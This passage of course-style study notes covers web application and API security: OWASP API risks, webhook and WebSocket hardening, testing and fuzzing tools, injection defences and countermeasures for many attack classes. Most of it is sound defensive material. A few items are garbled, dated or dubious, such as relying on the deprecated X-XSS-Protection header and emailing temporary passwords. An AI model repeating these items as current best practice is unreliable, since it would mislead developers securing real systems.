**Layer 3: SQL Database Query Layer (Data Ownership)**
- **Action:** When querying the SQL database, the data link layer uses SQL `JOIN` clauses based on the API call's context.
- **Security Mechanism:** This ensures that every query result inherently matches the user who made the API call. The database itself verifies the user context against the data it stores.
- **Benefit:** Prevents an authenticated user from seeing data belonging to another user (Broken Object Level Authorization).

**Layer 4: Mapper Layer (Data Filtering & Abstraction)**
- **Action:** After retrieving database records, a mapper layer converts them into user-visible models (e.g., Data Transfer Objects).
- **Security Mechanism:** This layer intentionally excludes sensitive implementation details, internal flags, or overly broad data fields from the models sent to the client.
- **Benefit:** Prevents exposure of sensitive data (e.g., internal user IDs, database metadata) that could aid an attacker.

**Layer 5: Response Filter Layer (Final Verification)**
- **Action:** Before sending the HTTP response, a final filter verifies the generated models.
- **Security Mechanism:** It double-checks that every record in the response matches the user who called the API. It discards any data models that do not clearly belong to the requesting user's account.
- **Benefit:** Acts as a "circuit breaker," ensuring that failures or misconfigurations in lower layers do not result in data leakage. It provides a final, absolute access control check.

## 5. Key Takeaways for Security Professionals

1.  **Don't rely on the developer alone.** API security requires a dedicated architectural layer (the gateway) and a dedicated role (security professional).
2.  **Implement security in layers.** No single validation step is sufficient. Use a "belt-and-suspenders" approach from user validation to final response filtering.
3.  **The API Gateway is your primary control point.** It enables centralized enforcement of authentication, authorization, rate limiting, and threat detection.
4.  **Always filter at the database level (Layer 3) AND at the response level (Layer 5).** The database ensures the user owns the data; the response filter ensures the data is never sent if ownership is unclear.
5.  **Hide internal complexity.** Use mapper layers (Layer 4) to prevent leaking sensitive implementation details through API responses.


---

# API Security Risks and Solutions (OWASP Top 10)

Based on OWASP's Top 10 API Security Risks, here are the risks and their corresponding solutions:

| Risk | Solutions |
|:---|:---|
| **API1: Broken Object-Level Authorization** | • Implement user policy-based authorization mechanism<br>• Verify logged-in user can perform requested action<br>• Use random/unpredictable values (e.g., GUIDs) for record IDs |
| **API2: Broken Authentication** | • Implement anti-brute-force mechanisms<br>• Add account lockout and CAPTCHA<br>• Enforce weak password checks<br>• Implement Multi-Factor Authentication (MFA) |
| **API3: Broken Object Property Level Authorization** | • Avoid generic methods like `json()` and `to_string()`<br>• Only allow updates to properties the client should change<br>• Return minimal data based on business requirements |
| **API4: Unrestricted Resource Consumption** | • Use solutions that limit resource usage<br>• Limit how often a client can execute operations |
| **API5: Broken Function-Level Authorization** | • Avoid complex function-level authorization<br>• Use simple, standard authorization with default-deny setting |
| **API6: Unrestricted Access to Sensitive Business Flows** | • Deny service to unexpected client devices<br>• Implement CAPTCHA or biometric solutions |
| **API7: Server-Side Request Forgery (SSRF)** | • Isolate resource fetching mechanisms<br>• Disable HTTP redirections |
| **API8: Security Misconfiguration** | • Encrypt all API communication via TLS<br>• Implement proper CORS policy |
| **API9: Improper Inventory Management** | • Maintain inventory of all API environments<br>• Conduct security reviews of all APIs<br>• Create risk rankings and improve higher-risk APIs |
| **API10: Unsafe Consumption of APIs** | • Always validate and sanitize data from integrated APIs<br>• Never trust third-party API data blindly |

---

# Best Practices for API Security

## Implementation & Coding Practices
- **Use HTTPS** via SSL/TLS certificates for encrypted client-server connections
- **Use server-generated tokens** as hidden HTML fields to validate incoming requests
- **Sanitize all data** to eliminate malicious scripts; properly validate user input
- **Use parameterized statements** in SQL queries to prevent injection attacks
- **Perform server-side input validation** (never rely on client-side validation alone)

## Access Control & Limiting
- **Use IP whitelisting** to restrict API access to trusted IP addresses/ranges
- **Implement rate limiting** to control API calls per time frame
- **Use pagination** to divide responses into fragments (prevents oversized payloads)
- **Use tokens** to establish trusted identities and control access
- **Use signatures** to ensure only authorized users can decrypt/modify data

## Monitoring & Maintenance
- **Maintain and monitor access logs** regularly to detect anomalies
- **Conduct regular security assessments** of all API endpoints using automated tools
- **Perform continuous auditing** and analyze workflows
- **Document audit logs** before and after security events; sanitize to prevent log injection

## Advanced Security Measures
- **Employ packet sniffers** to track information disclosure events
- **Use quotas and throttling** to control API usage and set request limits
- **Implement API gateways** to authenticate traffic and analyze usage
- **Implement MFA** and protocols like AppToken, OAuth2, OpenID Connect
- **Use WAF security** alongside TLS/SSL to reduce web traffic and injection attacks
- **Use SOAP APIs** (with built-in security) instead of design-based REST APIs when higher security is needed
- **Implement service mesh technology** for multi-service authentication
- **Add security headers**: `X-Frame-Options`, `X-XSS-Protection`, `Content-Security-Policy`
- **Implement proper error handling** that does not expose sensitive information
- **Implement token expiration and revocation** mechanisms

---

# Best Practices for Securing Webhooks

## Transport & Authentication
- **Use HTTPS instead of HTTP** to safeguard data in transit
- **Use shared authentication secrets** (e.g., HTTP Basic Auth) for all webhooks
- **Implement webhook signing** using HMAC-based signatures; use constant-time compare functions
- **Utilize API keys or similar credentials** to authenticate webhook requests

## Preventing Replay & Duplication
- **Track `event_id`** to avoid double-processing the same events
- **Compare request timestamp** (`X-Cld-Timestamp`) with current timestamp to prevent timing attacks
- **Ensure idempotent event processing** to prevent duplicate receipts
- **Use unique event ID** to record every webhook payload in the database

## Access Control & Filtering
- **Ensure firewall rejects** webhook calls from unauthorized sources (non-ESP IPs)
- **Use rate limiting** on webhook calls to control traffic
- **Verify clients via mutual TLS (mTLS)**
- **Use a webhook proxy service** for queuing, inspection, transformation, and retry capabilities
- **Verify source IP** against a whitelist or use DNS resolution

## Response & Error Handling
- **Respond with `200 OK`** on success (avoid `4xx`/`5xx` or webhooks may be deactivated)
- **Support HTTP HEAD method** to retrieve meta-information without full content transfer

## Additional Best Practices
- **Use threaded requests** to send multiple requests simultaneously
- **Store tokens against `store_hash`**, not user data
- **Do not send confidential information** via webhooks; use authorized APIs instead
- **Log each sent webhook** for debugging
- **Limit webhook payload size** to prevent DoS attacks

---

# Web Application Security Testing

## Manual Testing
- Uses manually designed data, customized code, and browser extensions (e.g., SecApps)
- Focuses on business logic errors and threat analysis
- Other tools: Selenium, Apache JMeter, LoadRunner, QTP, Bugzilla, Acunetix

## Automated Testing
- Automates testing process; incorporated into each development stage
- Provides constant feedback on code changes
- Tools: Ranorex Studio, TestComplete, Leapwork, Katalon Studio, Testsigma

## Static Application Security Testing (SAST) - White-box
- Complete system architecture and source code known to tester
- Tools: Codacy, JFrog, Klockwork

## Dynamic Application Security Testing (DAST) - Black-box
- Performed directly on running code
- Identifies issues in interfaces, requests/responses, sessions, scripts, authentication, injections
- Tools: Invicti, Acunetix Vulnerability Scanner, HCL AppScan

---

# Web Application Fuzz Testing (Fuzzing)

## Definition
Black-box testing method that sends massive amounts of random data ("fuzz") to identify coding errors and security loopholes.

## Steps of Fuzz Testing
1. Identify target system
2. Identify inputs
3. Generate fuzzed data
4. Execute test using fuzz data
5. Monitor system behavior
6. Log defects

## Fuzz Testing Strategies

| Strategy | Description |
|:---|:---|
| **Mutation-Based** | Starts with valid samples; mutates them until target is reached |
| **Generation-Based** | Creates new data from scratch; amount predefined based on testing model |
| **Protocol-Based** | Sends forged packets to target; requires detailed knowledge of protocol format |

## Fuzz Testing Tools
- WebScarab (OWASP)
- Burp Suite (PortSwigger)
- AppScan Standard (HCL)
- Defensics (Synopsys)
- ffuf (GitHub)

---

# AI-Powered Security Testing

## AI-Powered Fuzz Testing
- Uses machine learning to automate crafting of diverse, complex inputs
- **Pattern recognition:** Analyzes past tests to predict effective inputs
- **Continuous learning:** Adapts from real-time feedback to explore deeper code paths
- **Enhanced efficiency:** Focuses on code areas most likely to contain bugs

### Prompt Fuzzer (AI-Powered Tool for GenAI)
- Targets system prompts in GenAI applications
- Simulates real-world attacks (e.g., prompt injection)
- Analyzes LLM responses and assigns security scores
- Helps ethical hackers prioritize critical vulnerabilities

## AI-Powered Static Application Security Testing (SAST)

### Key Capabilities
- **Enhanced pattern recognition** beyond rule-based approaches
- **Zero-day vulnerability detection** before exploitation
- **Automated code analysis** with real-time feedback to developers
- **Reduced false positives/negatives** via NLP context understanding
- **Threat intelligence integration** to adapt to new threats

### AI-Powered SAST Tools
| Tool | Key Feature |
|:---|:---|
| **Code Genie AI** | Blockchain/smart contract security; automated vulnerability scanning; prioritized risk assessment |
| **Codiga** | Real-time feedback in IDEs; automated vulnerability fixes |
| **Corgea** | Automates generation of precise fixes |
| **Checkmarx SAST** | Streamlines vulnerability remediation |
| **Snyk Code** | Powered by DeepCode AI; trained on security-specific data |
| **CodeThreat** | AI-driven white-box fuzz testing |

## AI-Powered Dynamic Application Security Testing (DAST)

### Key Benefits
- **Simulates complex attack scenarios** by analyzing application behavior
- **Increases detection accuracy** with context-aware analysis
- **Intelligent test case generation** focused on high-risk areas
- **Self-learning and adaptation** from past testing data
- **Automation and CI/CD integration** for "shift left" security

### AI-Powered DAST Tools
| Tool | Key Feature |
|:---|:---|
| **ZeroThreat.ai** | Intelligent crawling; threat intelligence integration; minimizes false positives; fast scanning |
| **VoltSec.io** | Combines AI analysis with ethical hacker expertise |
| **AppCheck** | Automated penetration testing at scale |
| **Aptori** | Reconnaissance phase using AI algorithms |
| **Pentest Copilot** | Streamlines penetration testing with automated detection |
| **Beagle Security** | CI/CD integration; detailed vulnerability reports |
| **Veracode** | Combines SAST, DAST, and software composition analysis |

---

# Source Code Review

- Detects bugs and irregularities in web applications
- Can be performed manually or with automated tools
- Identifies areas handling authentication, session management, and data validation
- Identifies unvalidated data vulnerabilities and poor coding techniques

---

# Encoding Schemes

## URL Encoding
- Converts URLs to valid ASCII format for HTTP transport
- Replaces unusual characters with `%` followed by two-digit ASCII hex code
- Examples: `%3d` (=), `%0a` (new line), `%20` (space)

## HTML Encoding
- Represents unusual characters for safe inclusion in HTML documents
- Examples: `&amp;` (&), `&lt;` (<), `&gt;` (>)

## Unicode Encoding

| Type | Format | Example |
|:---|:---|:---|
| **16-bit Unicode** | `%u` + Unicode code point (hex) | `%u2215` (/) |
| **UTF-8** | `%` + each byte in hex | `%c2%a9` (©), `%e2%89%a0` (≠) |

## Base64 Encoding
- Represents binary data using only printable ASCII characters
- Used for email attachments and encoding user credentials

## Hex Encoding
- Uses hex value of each character to transmit binary data
- Example: `Hello` = `48 65 6C 6C 6F`

---

# Whitelisting vs. Blacklisting

## Application Whitelisting
- Lists approved application components permitted to execute
- Prevents unauthorized execution and malware spread
- Blocks unapproved or vulnerable applications
- Provides protection against ransomware

## Application Blacklisting
- Lists malicious applications NOT permitted to execute
- Blocks known malicious applications
- **Limitation:** Threat-centric; cannot detect modern threats
- Requires regular updates to protect against latest malware

## Whitelisting & Blacklisting Tools
- ManageEngine Application Control Plus
- BitDefender, Cisco Umbrella, Symantec Endpoint
- BrowseControl, Sucuri WAF

## Content Filtering Tools
- **TitanHQ WebTitan:** Blocks malware, phishing, viruses, ransomware, malicious sites
- NG Firewall Complete, Smoothwall Filter, FortiGuard, Barracuda, OpenDNS

---

# How to Defend Against Injection Attacks

## SQL Injection
- Limit user input length; use custom error messages
- Monitor DB traffic with IDS/WAF
- Disable commands like `xp_cmdshell`
- Isolate database and web servers
- Use prepared statements, parameterized queries, or stored procedures
- Use least-privileged accounts for DB connections
- Use ORM frameworks

## Command Injection
- Perform input validation; escape dangerous characters
- Use language-specific libraries that avoid shell commands
- Use safe APIs that avoid interpreter usage
- Run web apps with minimum required privileges (never as root)
- Use Java sandbox in J2EE environments

## LDAP Injection
- Perform type, pattern, and domain value validation
- Make LDAP filters as specific as possible
- Validate and restrict returned data amount
- Implement tight access control on LDAP directory
- Use LDAPS (LDAP over SSL)

## File Injection
- Strongly validate user input
- Disable `allow_url_fopen` and `allow_url_include` in php.ini
- Disable `register_globals`; use `E_STRICT`
- Vet all file and stream functions carefully

## Server-Side JS Injection
- Strictly validate server-side user inputs
- Avoid `eval()` function
- Use `JSON.parse()` instead of `eval()` for JSON
- Include `"use strict"` in functions

## Server-Side Include (SSI) Injection
- Validate user input to exclude SSI directives
- Apply HTML encoding before execution
- Avoid `.stm`, `.shtm`, `.shtml` extensions

## Server-Side Template Injection (SSTI)
- Never create templates from user inputs
- Execute templates in sandboxed environments
- Use template engine's built-in functionality for dynamic data
- Avoid template engines supporting dynamic code execution

## Log Injection
- Pass log codes instead of messages via parameters
- Use correct, recognizable error codes
- Avoid API calls for logging (visible in browser network)
- Use structured formats (JSON/XML) for logging

## CRLF Injection
- Encode CRLF special characters; avoid user input in response headers
- Replace `%0d`, `%0a` in URL-encoded data; `\r`, `\n` in standard input
- Use `htmlcleaner` tool to remove script tags

## XSS Attacks (Additional Countermeasures)
- Validate all headers, cookies, query strings, form fields, hidden fields
- Use WAF to block malicious scripts
- Convert non-alphanumeric characters to HTML entities
- Implement Content Security Policy (CSP)
- Use context-sensitive encoding
- Set `HttpOnly` flag on cookies
- Use `.innerText` instead of `.innerHTML`

---

# Web Application Attack Countermeasures (Comprehensive)

## Broken Access Control
- Perform access control checks before redirecting authorized users
- Avoid insecure IDs; provide session timeout
- Limit file permissions; use deny-by-default
- Remove session tokens on logout
- Use RBAC and ABAC; apply CORS restrictions

## Cryptographic Failures / Sensitive Data Exposure
- Do not create/use weak cryptographic algorithms
- Use AES-256 for symmetric encryption; RSA-2048 for asymmetric
- Use TLS with HSTS; encrypt data at rest
- Use hardware security modules (HSMs) or KMS for key storage
- Use bcrypt, scrypt, or Argon2 for password hashing

## Insecure Design
- Implement threat modeling; use secure development lifecycle (SDL)
- Perform application reliability checks at each stage
- Use OWASP SAMM or Microsoft SDL frameworks

## Security Misconfiguration
- Configure all security mechanisms; disable unused services
- Change default accounts/passwords
- Segment development, testing, and production environments
- Use configuration management tools (Ansible, Puppet, Chef)
- Apply CIS Benchmarks and NIST guidelines

## XML External Entity (XXE)
- Avoid processing XML with external entity references
- Configure XML parsers securely; use local static DTD
- Disable declared DTDs in XML documents
- Use XSD validation for XML uploads
- Log XML parsing activities

## Vulnerable & Outdated Components
- Regularly check component versions and dependencies
- Monitor NVD for vulnerabilities
- Use Software Composition Analysis (SCA) tools (OWASP Dependency-Check, Snyk, Black Duck)
- Isolate third-party components in containers/sandboxes

## Identification & Authentication Failures (Broken Authentication)
- Use SSL for all authenticated parts
- Store credentials in hashed form (bcrypt, scrypt, Argon2)
- Implement MFA; add CAPTCHA; use rate limiting
- Use proper session management; invalidate session after logout
- Return generic error messages ("invalid username and/or password")

## Software & Data Integrity Failures
- Enforce digital signatures to test integrity
- Use checksums (SHA-256) for file verification
- Use supply-chain security tools (OWASP Dependency Check, CycloneDX)
- Implement zero-trust architecture

## Insecure Deserialization
- Validate untrusted input before serialization
- Avoid serialization for security-sensitive classes
- Use object whitelisting
- Log deserialization exceptions and failures
- Prefer JSON/XML over serialization when possible

## Security Logging & Monitoring Failures (Insufficient Logging)
- Define scope of assets covered in log monitoring
- Establish minimum logging baseline
- Log with user context for traceability
- Use centralized logging (ELK Stack, Splunk, Graylog)
- Implement real-time monitoring and alerting

## Server-Side Request Forgery (SSRF)
- Strictly validate user-provided URLs/IPs against whitelist
- Disable HTTP redirections for server-initiated requests
- Enable deny-by-default access control
- Use next-gen WAF (NGWAF) for SSRF protection
- Route external requests through a proxy server

## Directory Traversal
- Define access rights to protected areas
- Remove/encode characters like `../`, `\`
- Use whitelist of allowable file paths
- Normalize file paths before using them
- Use chroot jail for Unix-based systems

## Unvalidated Redirects & Forwards
- Avoid using redirects/forwards when possible
- Use static URLs; map user input to predefined destinations
- Validate destinations against whitelist
- Use `rel="noopener noreferrer"` for external links

## Watering Hole Attack
- Regularly apply software patches
- Monitor network traffic; secure DNS servers
- Implement DNSSEC; use web filters
- Run browsers in virtual environments
- Use micro-virtualization

## Cross-Site Request Forgery (CSRF)
- Generate unique CSRF tokens per session
- Validate HTTP Referer header
- Use `SameSite` attribute for cookies
- Re-authenticate users for critical actions
- Use custom headers for state-changing requests

## Cookie/Session Poisoning
- Do not store plaintext passwords in cookies
- Implement cookie timeouts; use Secure and HttpOnly attributes
- Associate cookies with IP addresses
- Regenerate session IDs upon login
- Sign cookies with server-side secret

## Web Service Attacks
- Use multiple-layer protection; implement strong authentication (OAuth, JWT, API keys)
- Configure WSDL access control permissions
- Use SAML, X.509 certs, WS-Security
- Disable SOAP Action field when not in use
- Use TLS to secure SOAP communication

## Clickjacking Attack
- Use `X-Frame-Options` header (DENY, SAMEORIGIN, ALLOW-FROM URI)
- Never rely solely on client-side framebusting
- Use `Content-Security-Policy` (CSP) header

## JavaScript Hijacking
- Use `.innerText` instead of `.innerHTML`
- Avoid `eval()` function
- Return JSON with external object wrapper
- Prefix JSON responses to make them invalid JavaScript

## Username Enumeration
- Return generic error messages for all login failures
- Use CAPTCHA on all input pages
- Use rate limiting; implement geo-limiting
- Use email addresses instead of usernames when possible

## Attack on Password Reset Mechanism
- Validate random token and email link combination
- Use one-time reset URLs with expiration
- Use CAPTCHA; restrict requests per IP/device
- Use MFA; send temporary passwords via email

## Same-Site Attacks
- Use unique CSRF tokens per session
- Validate Referer and Origin headers
- Implement dangling domain validation
- Educate users on CNAME DNS entry verification

---

# Best Practices for Securing WebSocket Connections

- **Use WSS protocol** (`wss://`) instead of WS (`ws://`) for TLS/SSL encryption
- **Validate Origin header** to only accept connections from trusted domains
- **Use token-based authentication** (e.g., JWT) before establishing connection
- **Enforce RBAC** to ensure authorized actions only
- **Set message size limits** to prevent DoS attacks
- **Implement rate limiting** to control messages per timeframe
- **Implement session timeouts** to close inactive connections
- **Log all WebSocket activities** for auditing and monitoring
- **Use WebSocket subprotocols** to define/enforce communication rules
- **Ensure valid server certificates** from trusted CAs
- **Use well-maintained WebSocket libraries**
- **Set security headers** (CSP, X-Frame-Options)

---

# RASP (Runtime Application Self Protection) for Web Servers

## Definition
RASP provides security to web and non-web applications running on a server. It detects runtime attacks at the real-time software application layer.

## How It Works
- RASP layer is placed within the application code
- Monitors traffic coming into the server
- Applies protection mechanisms when threat vectors are detected
- Examines all requests through the RASP layer between server and application

## Benefits
| Benefit | Description |
|:---|:---|
| **Visibility** | Detailed view of application to monitor attacks |
| **Collaboration & DevOps** | Provides same information to security and development teams |
| **Penetration Testing** | Avoids duplicate testing; provides attack information |
| **Incident Response** | Facilitates logging for security and compliance without application modification |

## Key Advantage
Minimized false positives; can remediate unknown zero-day attacks without human intervention

---

# Web Application Security Testing Tools (Additional)

| Tool | Key Feature |
|:---|:---|
| **N-Stalker Web App Security Scanner** | 39,000 web attack signatures; component-oriented assessment |
| **Veracode** | IDE, Pipeline, and Policy scans; dynamic analysis for production apps |
| **Invicti** | DAST + IAST scanning approach; accurate automated testing |
| **Contrast Security** | Interactive application security testing |
| **Snyk** | Developer-first security; vulnerability scanning |
| **CodeSonar** | Code analysis for security vulnerabilities |
| **HCL AppScan** | Comprehensive application security testing |

---

# Web Application Firewalls (WAFs)

## Purpose
Secure websites, web applications, and web services against known and unknown attacks. Prevent data theft and manipulation of sensitive information.

## Cloudflare WAF
- Create custom rules to protect websites and APIs
- WAF attack scoring; uploaded content scanning
- Rate limiting for incoming requests

## Other WAFs
- Imperva WAF
- AppWall (Radware)
- Qualys WAF
- Barracuda Web Application Firewall
- NetScaler WAF

---

# Module Summary

## Topics Covered in This Module
- Web application concepts
- Various web application attacks
- Web application hacking methodology (footprinting, analysis, bypassing client-side controls, authentication attacks)
- Web application hacking tools
- Web API and webhook concepts
- Hacking web applications via web APIs
- Countermeasures against web application hacking attempts
- Securing web applications using security tools

## Next Module Preview
SQL injection attacks on target web applications (from both attacker and ethical hacker/pentester perspectives)

---

